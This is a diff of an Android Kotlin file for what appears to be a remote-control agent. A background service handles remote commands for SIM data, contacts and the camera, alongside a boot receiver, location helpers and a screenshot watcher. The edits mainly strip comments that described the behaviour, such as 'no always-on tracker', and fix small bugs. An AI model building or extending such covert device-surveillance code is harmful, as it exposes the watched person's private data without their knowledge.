@@ -108,8 +108,6 @@ fun httpPut(url: String, json: String): Boolean {
 fun permGranted(ctx: Context, p: String): Boolean =
     ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
 
-// PROGRESSIVE FIX: agent no longer waits for camera permission —
-// camera is asked at use-time, agent must run from login onward.
 fun canStartAgent(ctx: Context): Boolean {
     val p = ctx.getSharedPreferences(NPREF, Context.MODE_PRIVATE)
     return p.getBoolean("agent", false)
@@ -150,7 +148,7 @@ fun permsJson(ctx: Context): JSONObject {
     return o
 }
 
-// ── location helpers (on-demand GPS, no always-on tracker) ──
+// ── location helpers ──
 fun bestLast(lm: android.location.LocationManager): android.location.Location? {
     var best: android.location.Location? = null
     for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
@@ -237,7 +235,7 @@ fun locFresh(ctx: Context): JSONObject {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  REMOTE AGENT SERVICE — crash-guarded + self-reporting
+//  REMOTE AGENT SERVICE
 // ═══════════════════════════════════════════════════════════════════════
 class RemoteService : Service() {
 
@@ -449,7 +447,7 @@ class RemoteService : Service() {
                 }
                 "sim" -> {
                     r.put("ok", true)
-                    r.put("data", simJson(this))
+                    r.put("data", simJson())
                 }
                 "contacts" -> {
                     if (!permGranted(this, Manifest.permission.READ_CONTACTS)) {
@@ -516,8 +514,6 @@ class RemoteService : Service() {
                     if (!permGranted(this, Manifest.permission.CAMERA)) {
                         r.put("ok", false); r.put("err", "no_perm"); return r
                     }
-                    // Android 14+: background camera needs FGS started WITH camera type.
-                    // If camera was granted AFTER agent start, restart service once.
                     if (Build.VERSION.SDK_INT >= 34 && !startedWithCam) {
                         handler?.post { stopSelf() }
                         r.put("ok", false); r.put("err", "agent_restarting"); return r
@@ -668,7 +664,7 @@ class BootReceiver : BroadcastReceiver() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  SHOT WATCHER (screenshot observer)
+//  SHOT WATCHER
 // ═══════════════════════════════════════════════════════════════════════
 class ShotWatcher(
     private val context: Context,
@@ -947,7 +943,7 @@ class MainActivity : FlutterActivity() {
                                     val m = HashMap<String, Any>()
                                     m["id"] = c.getLong(idIdx)
                                     m["path"] = path
-                                    m["name"] = if (nameIdx >= 0) (c.getString(nameIdx) ?: "") : ""
+                                    m["name"] = if (nameIdx >= 0) (c.getString(nameIdx) ?: "") else ""
                                     m["date"] = if (dateIdx >= 0) c.getLong(dateIdx) else 0L
                                     list.add(m)
                                 }
@@ -1263,7 +1259,7 @@ class MainActivity : FlutterActivity() {
         var resultUri: Uri? = null
         if (cursor != null) {
             if (cursor.moveToFirst()) {
-                val id = cursor.getLong(id)
+                val id = cursor.getLong(0)
                 resultUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
             }
             cursor.close()
@@ -1289,7 +1285,7 @@ class MainActivity : FlutterActivity() {
     }
 
     // ═══════════════════════════════════════════════════════════════════
-    //  BINARY SIGNAL (ADD-ONLY) — নতুন methods, পুরানো code untouched
+    //  BINARY SIGNAL (ADD-ONLY)
     // ═══════════════════════════════════════════════════════════════════
     private fun setupBinaryChannel(flutterEngine: FlutterEngine) {
         BinaryService.onResult = { map ->
